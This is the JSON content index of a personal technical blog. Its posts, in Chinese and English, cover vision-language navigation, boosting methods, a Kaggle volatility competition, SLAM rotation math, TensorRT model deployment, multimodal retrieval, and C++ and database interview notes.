{"meta":{"title":"waynamigo's blog","subtitle":null,"description":null,"author":"waynamigo","url":"http://waynamigo.github.io","root":"/"},"pages":[{"title":"tags","date":"2019-07-13T16:06:18.000Z","updated":"2019-07-14T09:04:07.999Z","comments":false,"path":"tags/index.html","permalink":"http://waynamigo.github.io/tags/index.html","excerpt":"","text":""},{"title":"categories","date":"2019-07-13T16:06:28.000Z","updated":"2019-07-14T09:04:45.455Z","comments":false,"path":"categories/index.html","permalink":"http://waynamigo.github.io/categories/index.html","excerpt":"","text":""}],"posts":[{"title":"Vison-Language-Navigation","slug":"2021-08-01-vqa2vln","date":"2021-07-31T16:00:00.000Z","updated":"2021-08-04T09:18:12.616Z","comments":true,"path":"2021/08/01/2021-08-01-vqa2vln/","link":"","permalink":"http://waynamigo.github.io/2021/08/01/2021-08-01-vqa2vln/","excerpt":"关于CVPR2021，VQA2VLN的tutorial的总结","text":"关于CVPR2021，VQA2VLN的tutorial的总结 tutorial原地址：CVPR 2021 Tutorial on “From VQA to VLN: Recent Advances in Vision-and-Language Research”，本笔记总结一下在ppt里展示的VLN任务的内容，几位演讲者的视频还没看，毕竟有ppt和论文，概念理解应该不会有偏差 Background浏览了一下，VLN其实是算一个在人机交互大背景下的Visual+Language的研究方向，其实和之前做的三维重建+导航有点关系，总而言之是3D视觉方面的东西，下面总结了一些，细说 See, Communicate, Act机器模拟人的几种模拟方式，基本是将机器在看（视觉）、交流（文本）、行动几种模式下提高智能化，现在在See和Communicate两种模式的比较有代表性领域就是Computer Vision和Nature Language Processing，还有视觉和自然语言相结合的领域，例如Image-Understanding任务。前几年利用视觉和自然语言实现的智能化是从比较独立的模块获取的信息，比如目标检测，获取物体在图像上的(位置, 类别)，给机器做一些什么任务，比如统计xx，预测人流量等。目前用结合See-Communicate(Vision-Language)的发展比较好的方向有VQA, Captioning,Text2Image Generation等。 会议上提到的这个VLN领域的理念是Connecting Vision and Language to Actions, 将vision(2D,3D)、language和(行动/指令)联系起来，理解复杂场景，并对输入请求做出具体行动，相当于是Video Understanding下的子任务。 Embodied AI “Embodied AI is the field for solving AI problems for virtual robots that can move, see, speak, and interact in the virtual world.” 这是在page里的一个引言，关于实体AI(暂译)，就是让机器获得 视听说、行动、理解几种功能，集成算法达到一个接近人一样的智能体，从Internet AI 过渡到 Embodied AI，甚至是给AGI，Artificial General Intelligence打基础，有一个关于Embodied AI的survey：Duan et al., A survey of Embodied AI: From simulators to Research Tasks, 2021 Vision-Language NavigationVLN实际上是2018年提出的一个研究领域，子标题是Vision-and-Language Navigation: Interpreting visually-grounded navigation instructions in real environments, 在现实环境下，让机器理解基于视觉定位的导航指令。 左下是人为给出的指令&lt;\\purse&gt;通俗来讲VLN任务就是为了给机器人导航，有两个任务：①如何理解现实场景②对于给出的Instructions，如何理解并做出行动与3D视觉导航的区别（如自动驾驶使用的视觉SLAM、Radar等）： 3D-Navigation : SLAM下从图像帧中处理得到点云判别障碍物、方位 Sensor-Navigation : 传感器获取的空间信息（Radar、Lidar等） ，判别障碍物、方位SLAM —&gt; PointCloud —&gt; directionSensor —&gt; Mesh —&gt; direction VL-Navigation : Agent(摄像头)获取的视频信息，理解场景内容，并对指令做出行动，目前主要是在室内场景下研究导航任务 与VQA的区别VLN相对增加了动态视觉（相机运动）、长文本、测试集和训练集上的领域差距（在室内场景下训练，在室外场景测试，效果可能就急剧下降，并且一个训练样本就可以是整个场景，（比如浙江大学的3D重建方法，NeuralRecon，用的数据集Scannet）） Indoor VLN目前VLN主要是研究室内的导航任务，室内导航任务的几种指令难度等级 1. A到B的位移 2.找东西（可见） 3.找东西（不可见） 4.向人有针对性的提问得到更详细的信息，用这些追加的信息找东西 {% image /img/IndoorVLN.png '' '' %} Indoor VLN ChallengesSignificant Appearance Variation，同一种物体有不同外观 {% image /img/c1.png '' '' %} Rich Linguistic Phenomena，丰富的语境 {% image /img/c2.png '' '' %} Less Words, More Contents，文本所能表达的东西太少 {% image /img/c3.png '' '' %}VLN Models- Seq2seq (a golden baseline) • Speaker-follower - Attention Mechanism (something must try) • EnvDrop, Self-monitoring, OAAM - Transformer (this is all you need) • PREVALENT, Recurrent-Bert - Reinforcement Learning (Add-on) • RCM, Soft ExpertDatasetsR2R CVDNMetrics- Success / Oracle Success Rate (%) - Navigation Error (m) - SPL (Success weighted by Path Length) - CLS (Coverage weighted by Length Score) • Measuring fidelity to the reference path - nDTW (normalized Dynamic Time Warping) - SDTW (Success weighted by normalized Dynamic Time Warping)","categories":[{"name":"其他","slug":"其他","permalink":"http://waynamigo.github.io/categories/其他/"}],"tags":[{"name":"ML","slug":"ML","permalink":"http://waynamigo.github.io/tags/ML/"},{"name":"DL","slug":"DL","permalink":"http://waynamigo.github.io/tags/DL/"},{"name":"MultiMedia","slug":"MultiMedia","permalink":"http://waynamigo.github.io/tags/MultiMedia/"},{"name":"Vision","slug":"Vision","permalink":"http://waynamigo.github.io/tags/Vision/"},{"name":"NLP","slug":"NLP","permalink":"http://waynamigo.github.io/tags/NLP/"}]},{"title":"统计学习笔记(后篇)","slug":"2021-07-01-statics_note","date":"2021-06-30T16:00:00.000Z","updated":"2021-07-26T02:56:50.651Z","comments":true,"path":"2021/07/01/2021-07-01-statics_note/","link":"","permalink":"http://waynamigo.github.io/2021/07/01/2021-07-01-statics_note/","excerpt":"接上一篇统计学习笔记，最近在做kaggle，用到了几种Boost，有机会把以前笔记剩余部分的补上了。","text":"接上一篇统计学习笔记，最近在做kaggle，用到了几种Boost，有机会把以前笔记剩余部分的补上了。 Boost一句话概括Boost方法就是：将N个弱学习算法构建成一个相当于强学习算法的方法。重点记录AdaBoost和XGBoost两个模型，也是实际应用中广泛使用的方法，效果和时间性能很好。sklearn的ensemble里封装了AdaBoostClassifier，以后写一个kaggle常用的sklearnAPI总结吧。Adaboost解决两个问题 每一轮如何改变训练数据的权值或者概率分布 如何将N个弱学习模型组合成一个强学习模型12341.通过在n个训练样本上迭代得到第一个弱分类器C12.将分错的样本和其他的新数据构建新训练样本n，在这上面迭代得到C23.将1.2.都分错的样本和新数据构建新训练样本n，迭代得到C34. 设有J个弱分类器，训练样本(X,Y),n维，Adaboost算法流程如下 ，","categories":[{"name":"数学","slug":"数学","permalink":"http://waynamigo.github.io/categories/数学/"}],"tags":[{"name":"Boost","slug":"Boost","permalink":"http://waynamigo.github.io/tags/Boost/"},{"name":"AdaBoost","slug":"AdaBoost","permalink":"http://waynamigo.github.io/tags/AdaBoost/"},{"name":"XGBoost","slug":"XGBoost","permalink":"http://waynamigo.github.io/tags/XGBoost/"}]},{"title":"Optiver Realized Volatility Prediction","slug":"2021-07-01-kaggle-LGB-optiver-realized-volatility-prediction","date":"2021-06-30T16:00:00.000Z","updated":"2021-07-20T01:35:00.862Z","comments":true,"path":"2021/07/01/2021-07-01-kaggle-LGB-optiver-realized-volatility-prediction/","link":"","permalink":"http://waynamigo.github.io/2021/07/01/2021-07-01-kaggle-LGB-optiver-realized-volatility-prediction/","excerpt":"以后写kaggle尽量都用一些实用性的算法，该面向简历编程了，论文阅读笔记之类的以后都尽量用英语写","text":"以后写kaggle尽量都用一些实用性的算法，该面向简历编程了，论文阅读笔记之类的以后都尽量用英语写 BackgroundOptiver Realized Volatility Prediction Competition.This kaggle project is about trying diff methods to predict the volatility of a trading floor for trading firms,The Accurate Volatility, which is essencial for their investing options.Also is an essencial data standard related to the price of underlying product.IN short, We have to find the most effective approach to minus RMSPE. Given Data12345dataset├── book_test.parquet├── book_train.parquet├── trade_test.parquet└── trade_train.parquet Each folder contains stock_id=ntrade [‘time_id’, ‘seconds_in_bucket’, ‘price’, ‘size’, ‘order_count’]book [‘time_id’, ‘seconds_in_bucket’, ‘bid_price1’, ‘ask_price1’, ‘bid_price2’, ‘ask_price2’, ‘bid_size1’, ‘ask_size1’, ‘bid_size2’, ‘ask_size2’],train [‘stock_id’,’time_id’,’target’]test [‘stock_id’,’time_id’,’row_id’] financial conceptsshow case: bid price ask 151 196 150 189 149 148 148 221 251 147 351 146 300 145 20 144 1.Content of an order book - A list of buy or sell records sorted by price, which lists the number of shares being bid on or offered at each price point. - in the case of given data,’bid’ means How many shares the Buyer want to buy , ‘ask’ means How many shares Sellers offer. EACH order book&amp;trade book belongs to 1 kind of stock 2.Trade procedure - a TRADE HAPPENS when the shares of stock that seller S offers and buyer B bids at the same price. - B can up his/her intended price and buy the offered by S. 3.Liquidity there’re some statistics standards for analyser to estimate the liquidity of an order book. - WAP(weighted avaraged price)takes the price level and size of orders $$wap = \\frac{bidprice1asksize1+askprice1bidsize1}{asksize1+bidsize1}$$ Code for WAP caculation, add one column as ‘wap’ 1234book_parquet['wap'] = (book_parquet['bid_price1'] * book_parquet['ask_size1'] + book_parquet['ask_price1'] * book_parquet['bid_size1'])/(book_parquet['bid_size1']+ book_parquet['ask_size1']) 4.Log returnsanother vital standard for comparing the price of a stock in yesterday and todaycalling $S_t$ is the price of stock at time $t$ ,the log return is $r_{t1,t2}$,$$r_{t_1, t_2} = \\log{\\frac{S_{t_2}}{S_{t_1}}}$$Noticed The host wants competitors should use WAP to compute log returns, and assuming that log returns have 0 meanThen the Code for LogReturn is as follows and add it to book table.Additionally we should expire the NaN row: 12345def LogReturn(WAP): return np.log(WAP)book_parquet['logreturn'] = LogReturn(book_parquet)#expire NaN itemsbook_parquet = book_parquet[~book_example['log_return'].isnull()] 5.Realized VolatilityVolatility is described as ‘the annualized standard deviation of one year’s LogReturn’$$\\sigma = \\sqrt{\\sum\\limits_t{r^2_{t-1,t}}}$$ For each stock data, we find that different stock have different volatility characteristics, So one column should be added as ‘stock_id’, using 12stock_id = ibook_parquet.loc[:,'stock_id'] = stock_id EvaluationThe evaluation metric is Root Mean Square Percentage Error, as:$$\\text{RMSPE} = \\sqrt{\\frac{1}{n} \\sum_{i=1}^{n} ((y_i - \\hat{y}_i)/y_i)^2}$$The formula above can be implemented as: 1234def RMSPE(yhat, data): y = data.get_label() elements = ((y - yhat) / y) ** 2 return float(np.sqrt(np.sum(elements) / len(y))) Method(s)I looked through the Discussion board, found most are using XGBoost and LightGBT, I get begin from DataProcessing module and the baseline is implemented with XGBoost, LightGBT will be done later. data processingFirst check how we should process the parquet file.Parquet is a columnar storage format available to any project in the Hadoop ecosystem, regardless of the choice of data processing framework, data model or programming language.Hoster provided code for process the columnar file.and, I’m goin to try to run this method and data on Spark, The code will be release later on github.Process code: 12 APIsyou can use https://lightgbm.readthedocs.io/en/latest/pythonapi/lightgbm.plot_importance.html to see the feature importance of your model.","categories":[{"name":"kaggle","slug":"kaggle","permalink":"http://waynamigo.github.io/categories/kaggle/"}],"tags":[{"name":"ML","slug":"ML","permalink":"http://waynamigo.github.io/tags/ML/"},{"name":"kaggle","slug":"kaggle","permalink":"http://waynamigo.github.io/tags/kaggle/"},{"name":"Boosting","slug":"Boosting","permalink":"http://waynamigo.github.io/tags/Boosting/"},{"name":"xgboost","slug":"xgboost","permalink":"http://waynamigo.github.io/tags/xgboost/"},{"name":"GBDT","slug":"GBDT","permalink":"http://waynamigo.github.io/tags/GBDT/"}]},{"title":"3D重建及其深度学习方法的相关论文解析","slug":"2021-05-13-3D视觉_三维重建","date":"2021-05-12T16:00:00.000Z","updated":"2021-08-04T08:37:36.397Z","comments":true,"path":"2021/05/13/2021-05-13-3D视觉_三维重建/","link":"","permalink":"http://waynamigo.github.io/2021/05/13/2021-05-13-3D视觉_三维重建/","excerpt":"最近实习在读浙大最近的NeuralRecon，里面涉及到一些3D点云处理的数学方法和3DVison的深度学习Tricks，主要包括TSDF算法，特征点提取的SIFT、ORB两种算法，及稀疏卷积等，以及SLAM(simultaneous localization and mapping)基础，从《视觉SLAM十四讲》（高翔等）学习基础。双目算法现在已经比较成熟，目前自己工作只涉及单目相机。","text":"最近实习在读浙大最近的NeuralRecon，里面涉及到一些3D点云处理的数学方法和3DVison的深度学习Tricks，主要包括TSDF算法，特征点提取的SIFT、ORB两种算法，及稀疏卷积等，以及SLAM(simultaneous localization and mapping)基础，从《视觉SLAM十四讲》（高翔等）学习基础。双目算法现在已经比较成熟，目前自己工作只涉及单目相机。 SLAM框架视觉里程计（Visual Odometry）目前项目的硬件设备由单目相机获取信息，进而进行姿态估计、深度估计等计算。简单来说，VO是由相邻两张图片间像素的位置关系估计相机的位置， 坐标变换 旋转矩阵求相机坐标系（o）到世界坐标系（w）下的旋转矩阵$R^o_w$，进行欧式变换可以将o下的向量$p_o$ 转换到w下向量$p_w$求出刚体旋转矩阵$R^o_w$，那么w下向量$p_w$左乘R就可以转化到$p_o$:$p_o = R^o_w \\cdot\\ p_w$同理如果两个坐标系下的旋转矩阵可以得到$m = $eg. 下面是由w到o1 和o2两个旋转矩阵传递得到的o1 -&gt; o2的旋转矩阵设两个相机坐标系下o1,o2对应的三个点a b c，d e f，各获得两个向量 $m1,n1$,$m2,n2$分别构建出该点集合所在的坐标系方程，求解得到世界坐标到o1 , o2的旋转坐标$R_1,R_2$， 则有：世界坐标系向量$m2 = R_1^T \\cdot R_2 \\cdot m1$ 1234567891011121314151617181920212223242526272829def RigidBody_Transform(p=np.zeros((3,3),dtype=float), q=np.zeros((3,3),dtype=float)): # 世界坐标到 O1的旋转矩阵 ，x = x / ||x|| 单位化 x = (p[1,:] - p[0,:]) / np.linalg.norm(p[1,:] - p[0,:]) y = (p[2,:] - p[1,:]) - np.inner(np.inner((p[2,:] - p[1,:]),x), x) y = y / np.linalg.norm(y) # y_bar = y / ||y|| # 单位化第二行 print(&quot;x&quot;,x) print(&quot;y&quot;,y) z = np.cross(x, y) #叉乘 print(&quot;z&quot;,z) rotate_matrix_w2o1 = np.array([x, y, z]) # 世界坐标到 O2的转转矩阵 x_new = (q[1,:] - q[0,:]) / np.linalg.norm(q[1,:] - q[0,:]) y_new = (q[2,:] - q[1,:]) - np.inner(np.inner((q[2,:] - q[1,:]),x_new), x_new) y_new = y_new / np.linalg.norm(y_new) # 这里要注意，叉积（cross product）和 外积（outer product）不一样 # ps:国内教材讲的是叉积和外积一样 # np.cross算叉积 ，np.outer算外积 z_new = np.cross(x_new, y_new) #这要计算的是叉积（只有三维空间有意义，就是右手系的那个） rotate_matrix_w2o2 = np.array([x_new, y_new, z_new]) return rotate_matrix_w2o1,rotate_matrix_w2o2, (rotate_matrix_w2o1.T * rotate_matrix_w2o2)#p = np.array([(-47.34,-18.71,-155.02), (-73.64,-29.82,-210.88), (-64.88,-36.77,-216.15)])#p = np.array([(-4.34,-36.71,51), (-30,25.5,-4), (-21,18,-10.15)])#q = np.array([(-40,25.5,6), (-30,25.5,-4), (15.01,55.19,22.818)])p = np.array([(0,1,0), (0,0,0), (0,0,1)])q = np.array([(0,-1,0), (0,0,0), (0,0,-1)])m1,m2,rotate_matrix = RigidBody_Transform(p, q)print(&quot;rotate_matrix is:\\n&quot;)print(rotate_matrix) 旋转向量上面的旋转矩阵表示具有局限性，原因是求出的矩阵必须是正交阵，优化时比较困难，并且计算量比较大，需要进行矩阵运算，一次运算需要9次浮点乘法，所以又提出一个用旋转角和旋转轴表示一个旋转向量的描述旋转的方法。同时，旋转向量也可以转换成旋转矩阵:由罗德里格斯公式(Rodrigus’ Formula)，n_r 即n^，表示向量n到n对应的反对称矩阵的转换符，计算如下：$a \\times b=\\begin{Vmatrix} e_1&amp;e_2&amp;e_3\\\\a_1&amp;a_2&amp;a_3\\\\b_1&amp;b_2&amp;b_3 \\end{Vmatrix}=\\begin{bmatrix} a_2b_3-a_3b_2\\\\a_3b_1-a_1b_3\\\\a_1b_2-a_2b_1 \\end{bmatrix}=\\begin{bmatrix}0&amp;-a_3&amp;a_2\\\\a_3&amp;0&amp;-a_1\\\\ -a_2&amp;a_1&amp;0\\end{bmatrix} \\cdot b = a$^$b$上面的$a$^ 表示其对应的反对称矩阵$R = cos \\theta I + (1-cos\\theta) n \\cdot n^T + sin\\theta n$^求转角$\\theta$，可以：$tr(R)= \\cos\\theta tr(I) +(1-\\cos\\theta)tr(n \\cdot n^T) +\\sin\\theta tr(n$^$)$$\\quad\\quad =3\\cos\\theta +(1-\\cos\\theta) = 1+2\\cos\\theta$求出$\\theta = \\arccos \\frac{tr(R)-1}{2}$ 回环检测（Loop Closure Detection）判断镜头是否到达过先前位置，和后端（优化）解决因里程计每次计算相邻两张图片的位置关系，每次前后误差叠加出现的漂移问题，简而言之就是校正。 后端优化（非线性）接受VO获得的相机位姿、回环检测 建图还没整理好 3D点云模型相机模型相机模型得到的相机内参(camera_intrinsic_perview)一般为一张图得到一个通过两种模型针孔模型（PINHOLE，还有放射模型RADIAL），畸变模型两种实现内参计算","categories":[{"name":"3DPointCloud","slug":"3DPointCloud","permalink":"http://waynamigo.github.io/categories/3DPointCloud/"}],"tags":[{"name":"3DVision","slug":"3DVision","permalink":"http://waynamigo.github.io/tags/3DVision/"},{"name":"3DPointCloud","slug":"3DPointCloud","permalink":"http://waynamigo.github.io/tags/3DPointCloud/"},{"name":"DeepLearning","slug":"DeepLearning","permalink":"http://waynamigo.github.io/tags/DeepLearning/"},{"name":"SLAM","slug":"SLAM","permalink":"http://waynamigo.github.io/tags/SLAM/"}]},{"title":"NeuralRecon for 3D reconstruction in real-time","slug":"2021-05-11-summary_neucon","date":"2021-05-10T16:00:00.000Z","updated":"2021-05-13T01:14:57.810Z","comments":true,"path":"2021/05/11/2021-05-11-summary_neucon/","link":"","permalink":"http://waynamigo.github.io/2021/05/11/2021-05-11-summary_neucon/","excerpt":"图像pair 提取特征点算法SIFTSURFORB","text":"图像pair 提取特征点算法SIFTSURFORB","categories":[{"name":"3D vision","slug":"3D-vision","permalink":"http://waynamigo.github.io/categories/3D-vision/"}],"tags":[{"name":"3DVision Projection TSDF","slug":"3DVision-Projection-TSDF","permalink":"http://waynamigo.github.io/tags/3DVision-Projection-TSDF/"}]},{"title":"DenseDescriptor for SfM Datasset Preparation","slug":"2021-04-20-DenseDescriptor","date":"2021-04-18T16:00:00.000Z","updated":"2021-06-26T10:14:00.462Z","comments":true,"path":"2021/04/19/2021-04-20-DenseDescriptor/","link":"","permalink":"http://waynamigo.github.io/2021/04/19/2021-04-20-DenseDescriptor/","excerpt":"一些单目三维重建的概念，及DepthEstimation代码的阅读","text":"一些单目三维重建的概念，及DepthEstimation代码的阅读 4-19日-4月21日123Colmap提取的数据，SFMDataset用来初始化ColMap提取SFM数据，作为训练数据集，读取及处理方式 SLAM和ColMap两个生成数据,输入到DenseDescriptor的兼容性class:SFMDataset Format image_file_names 拆好的图像序列，有序folder_list data里面的文件夹train/data/1 train/data/2adjandance_range 1 50 邻接范围,控制1-50的随机增量image_downsampling 2.5 图像下采样倍数 resize到 原来的2.5xnetwork_downsampling 64 for downsample and crop mask的参数inlier_percentage 0.99 阈值ground truthload_intermediate_data True/False 是否加载预计算数据，存在precompute的pickle文件里precompute.pklintermediate_data_root precompute文件⬆️的pathsampling_size 10heatmap_sigma 5.0 热图参数，用于generate_heatmap_from_locations,生成训练的sourcemap和targetmappre_workers 4visible_interval 可视化间隔，，用在overlap点云的函数里，和读取colmapresult的函数一起预处理，避免点云密集，可以调整该参数控制稀疏程度。 num_iter 每个epoch的迭代次数，训练的时候在看 precompute.pkl 按作者计算的程序来吧，反正按路径来就没问题 crop_positions_per_seq selected_indexed_per_seq visible_view_indexes_per_seq point_cloud_per_seq intrinsic_matrix_per_seq mask_boundary_per_seq view_indexes_per_point_per_seq extrinsics_per_seq projection_per_seq clean_point_list_per_seq image_downsampling //这三个是 network_downsampling inlier_percentage // 符合ground trueth的阈值 estimated_scale_per_seq 使用tensorrt生成engine进行推理https://zhuanlan.zhihu.com/p/351426774c++ 写法、思路如下 先将pytorch的Network先转成onnx模型。如果使用DataParallel进行多GPU训练的话，需要注意节点前面的Module.注意版本，某些函数是onnx默认运算符集不支持的函数，比如forbenius norm，只能转成Aten运算符，Aten运算符竟然没找到很好的文档，为了避免风险升级pytorch到 1.6，将运算符集合版本导出为11，支持了现在的大多数函数 1code here 导出onnx在netron看一下，没问题就可以开始用C++转Trt模型，主要包括加载、解析onnx，序列化两个操作进行 12345678910111213141516171819202122std::string trtEngineName = \"out.engine\";sammple::Logger glogger; nvinfer1::IBuilder* builder = createInferBuilder(gLogger.getTRTLogger());//createInferBuilder(ILogger&amp; logger);INetWorkDefinition* network = builder-&gt;createNetWorkV2(maxBatchSize);//IBuilderConfig* config = builder-&gt;createBuilderConfig();auto parser =nvonnxparser::createParser(*network,gLogger.getTRTLogger());// a parser for onnxbuilder-&gt;setMaxWorkspaceSize(1_GiB);//NVIDIA document claims \"lets TensorRT pick any algorithm available.\"config-&gt;setMaxWorkspaceSize(1_GiB);builder-&gt; setFp16Mode(gArgs.runInFp16);//two inference mode, FP16 and Int8, Float16 is okaysamplesCommon::enableDLA(builder, config, gArgs.useDLACore);// DLA is to accelerate some layer // DALI to accelerate data readingICudaEngine* engine = builder-&gt;buildCudaEngine(*network);// build cudaengine of \"NvInferRuntime.h\"IHostMemory* trtModel = nullptr;// init stream as null pointtrtModel = engine -&gt;serialize(); // serialize the onnx modelstd::ofstream ofs(trtEngineName.c_str(), std::ios::out | std::ios::binary);ofs.write((char*)(trtModel-&gt;data()), trtModel-&gt;size());ofs.close(); 上一步导出的模型为out.engine，下一步加载该TRT model（或CudaEngine） 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152struct TensorRT &#123; IExecutionContext* context; ICudaEngine* engine; IRuntime* runtime;&#125;;TensorRT* LoadNet(const char* trtFileName)&#123; std::ifstream t(trtFileName, std::ios::in | std::ios::binary); std::stringstream tempStream; tempStream &lt;&lt; t.rdbuf(); t.close(); DebugP(\"TRT File Loaded\"); tempStream.seekg(0, std::ios::end); const int modelSize = tempStream.tellg(); tempStream.seekg(0, std::ios::beg); void* modelMem = malloc(modelSize); tempStream.read((char*)modelMem, modelSize); IRuntime* runtime = createInferRuntime(gLogger); if (runtime == nullptr) &#123; DebugP(\"Build Runtime Failure\"); return 0; &#125; if (gArgs.useDLACore &gt;= 0) &#123; runtime-&gt;setDLACore(gArgs.useDLACore); &#125; ICudaEngine* engine = runtime-&gt;deserializeCudaEngine(modelMem, modelSize, nullptr); if (engine == nullptr) &#123; DebugP(\"Build Engine Failure\"); return 0; &#125; IExecutionContext* context = engine-&gt;createExecutionContext(); if (context == nullptr) &#123; DebugP(\"Build Context Failure\"); return 0; &#125; TensorRT* trt = new TensorRT(); trt-&gt;context = context; trt-&gt;engine = engine; trt-&gt;runtime = runtime; DebugP(\"Build trt Model Success!\"); return trt;&#125;","categories":[{"name":"3DPointCloud","slug":"3DPointCloud","permalink":"http://waynamigo.github.io/categories/3DPointCloud/"}],"tags":[{"name":"DeepLearning","slug":"DeepLearning","permalink":"http://waynamigo.github.io/tags/DeepLearning/"},{"name":"3DPointclouod","slug":"3DPointclouod","permalink":"http://waynamigo.github.io/tags/3DPointclouod/"},{"name":"DepthEstimation","slug":"DepthEstimation","permalink":"http://waynamigo.github.io/tags/DepthEstimation/"}]},{"title":"跨媒体检索/多模态计算 方向动态","slug":"2021-04-08-图像视频信息提取与检索","date":"2021-04-07T16:00:00.000Z","updated":"2021-07-28T07:22:34.707Z","comments":true,"path":"2021/04/08/2021-04-08-图像视频信息提取与检索/","link":"","permalink":"http://waynamigo.github.io/2021/04/08/2021-04-08-图像视频信息提取与检索/","excerpt":"写在前面：跨媒体检索方向涵盖许多任务，涉及到图像、文本、语音、视频等多种模态的数据，事实上根据项目需求，开发者可以将所需的识别、分割、生成、编码等方法集成到检索或推荐项目中。本文整理了在网络上能搜集到的Baidu、Youtube、Google、Facebook检索系统和大数据架构实现方案当做参考。","text":"写在前面：跨媒体检索方向涵盖许多任务，涉及到图像、文本、语音、视频等多种模态的数据，事实上根据项目需求，开发者可以将所需的识别、分割、生成、编码等方法集成到检索或推荐项目中。本文整理了在网络上能搜集到的Baidu、Youtube、Google、Facebook检索系统和大数据架构实现方案当做参考。 多模态信息检索的挑战和攻克方向In fact, researchers and algorithm engineers in the field of information retrieval focus more on tasks such as data mining, feature representation, and analysis of user behavior. From the recent conferences like SIGIR and ACMMM, some research directions retrieved are as follows:2021 SIGIRBias and counterfactual learningRecommendationSearching and RankingSocial AspectsKnowledge StructuresQuestion AnsweringSequences and SessionsAdversarial Information RetrievalMulti-modal Information RetrievalMultiMedia Information RetrievalMulti-modal Fusion and Embedding2020 SIGIR As noticed, the main modalities are visual, texual, and acoustic. The challanges lie on Multimodal Fusion. Many problems in engeneer often comes to: Infor mation loss, hierachical structure transductive learningoptimal latent space, can maintance original intrinsic characteristics of microvideo in original space","categories":[{"name":"其他","slug":"其他","permalink":"http://waynamigo.github.io/categories/其他/"}],"tags":[{"name":"ML","slug":"ML","permalink":"http://waynamigo.github.io/tags/ML/"},{"name":"DL","slug":"DL","permalink":"http://waynamigo.github.io/tags/DL/"},{"name":"MultiMedia","slug":"MultiMedia","permalink":"http://waynamigo.github.io/tags/MultiMedia/"},{"name":"Recommendation","slug":"Recommendation","permalink":"http://waynamigo.github.io/tags/Recommendation/"}]},{"title":"CPP面试","slug":"2021-03-26-cpp面试知识","date":"2021-03-25T16:00:00.000Z","updated":"2021-07-26T09:09:03.192Z","comments":true,"path":"2021/03/26/2021-03-26-cpp面试知识/","link":"","permalink":"http://waynamigo.github.io/2021/03/26/2021-03-26-cpp面试知识/","excerpt":"持续更新","text":"持续更新 概念性区分1.C和C++的区别C面向过程，C++面向对象C的内存管理使用malloc free，C++还可以使用new deleteC不支持函数重载，C++支持函数重载C没有引用，C++可以用引用堆和栈的区别stack编译器自动分配和释放，自底向上的数据结构heap需要由程序员手动new delete，会产生外部碎片，是自上到下的数据结构c++中不能被继承的成员函数析构函数和构造函数const定义常量修饰函数参数和函数返回值 修饰函数定义体，函数为类的成员函数，const修饰后的成员函数不修改成员变量的值define给一个立即数，const是常量，放在静态区域，全局变量也在静态区域静态区：static无论是全局变量还是局部变量都存储在全局/静态区域，在编译期就为其分配内存，在程序结束时释放const的全局变量存储在只读数据段，第一次使用时被分配内存，结束时释放；const的局部变量存在栈中，代码块结束释放define定义的常量不可以用指针去指向，const定义的常量可以用指针去指向该常量的地址–const优点const 常量有数据类型，而宏常量没有数据类型。编译器可以对前者进行类型安全检查，后者只进行字符替换，没有类型安全检查，并且在字符替换可能报错。[全局变量放在静态存储区，整个程序开始分配内存，结束释放]staticstatic修饰的变量只能通过其所在文件、模块或函数进行调用，限制变量static修饰的变量一开始就得初始化，并存放于静态内存区volatile本条指令不会因编译器的优化而省略，不会被编译器察觉（隐藏变量），且要求每次重新读取volatile修饰的变量的内容extern 指针和引用的区别引用本质是只读指针，引用只能在初始化时被赋值,且必须被初始化，之后不能改变，指针是动态的引用不能为NULL，指针可以引用做函数参数时，内部传递的是变量地址进程间通信pipe管道，半双工，用于父子进程通信semaphore信号量，进程同步访问共享资源message que 消息队列，克服了缓冲区限制shared memory共享内存socket线程间通信全局变量 Messages消息机制；CEvent对象（MFC中的一种线程通信对象，通过其触发状态的改变实现同步与通信） 编译时运算符:sizeof 写一个函数指针( ( void ()() ) 0x100000) ( );void()()强制转换0x100000typedef void()() voidFunc;*( (voidFunc)0x100000 )(); 内存分配方式 从静态存储区域分配。内存在程序编译的时候就已经分配好，这块内存在程序的整个运行期间都存在。例如全局变量。 在栈上创建。在执行函数时，函数内局部变量的存储单元都可以在栈上创建，函数执行结束时这些存储单元自动被释放。栈内存分配运算内置于处理器的指令集中，效率很高，但是分配的内存容量有限。 从堆上分配，亦称动态内存分配。程序在运行的时候用malloc或new申请任意多少的内存，程序员自己负责在何时用free或delete释放内存。动态内存的生存期由我们决定，使用非常灵活，但问题也最多。","categories":[{"name":"CPP","slug":"CPP","permalink":"http://waynamigo.github.io/categories/CPP/"}],"tags":[{"name":"CPP，面试","slug":"CPP，面试","permalink":"http://waynamigo.github.io/tags/CPP，面试/"}]},{"title":"模型集成策略","slug":"2021-01-12-模型集成","date":"2021-01-11T16:00:00.000Z","updated":"2021-07-16T13:55:00.514Z","comments":true,"path":"2021/01/12/2021-01-12-模型集成/","link":"","permalink":"http://waynamigo.github.io/2021/01/12/2021-01-12-模型集成/","excerpt":"新坑","text":"新坑 stacking","categories":[{"name":"ML","slug":"ML","permalink":"http://waynamigo.github.io/categories/ML/"}],"tags":[{"name":"ML","slug":"ML","permalink":"http://waynamigo.github.io/tags/ML/"},{"name":"DL","slug":"DL","permalink":"http://waynamigo.github.io/tags/DL/"},{"name":"stacking","slug":"stacking","permalink":"http://waynamigo.github.io/tags/stacking/"}]},{"title":"数据库系统相关","slug":"2021-01-11-数据库","date":"2021-01-10T16:00:00.000Z","updated":"2021-01-13T07:10:42.630Z","comments":true,"path":"2021/01/11/2021-01-11-数据库/","link":"","permalink":"http://waynamigo.github.io/2021/01/11/2021-01-11-数据库/","excerpt":"关于计算机研究生复试的数据库相关问题（笔试）","text":"关于计算机研究生复试的数据库相关问题（笔试） 系统概念相关数据视图数据抽象： 物理层–&gt;逻辑层–&gt;视图层实例和模式：物理模式–&gt;逻辑模式–&gt;子模式数据集合是实例(Instance)， 数据库总体设计为数据库模式(Schema)数据模型： 关系模型 实体-联系模型（E-R) 基于对象的模型 半结构化数据模型 关系运算域：关系中的某属性允许取值的集合码：整个关系中区分不同元组的一种性质超码 super key：一个或多个属性的集合，唯一标识一个元组,允许有多余的属性候选码 candidate key：允许最少必要属性的超码即候选码比如{ID}{name,seat}是两个候选码主码 primary key：设计者在一个关系内的候选码中选择的区分元组的属性组合主码选择原则：选择那些值从不改变或极少改变的候选码作primary key外码 foreign key：一个关系内的某属性是另一个关系的主码 关系代数 选择元组/属性 σ 投影 π 自然连接 ∞ 笛卡尔积 X 集合运算 交 并 自然连接举例 A B C D B E 1 a 3 2 c 7 2 b 6 3 d 5 3 c 7 1 a 3 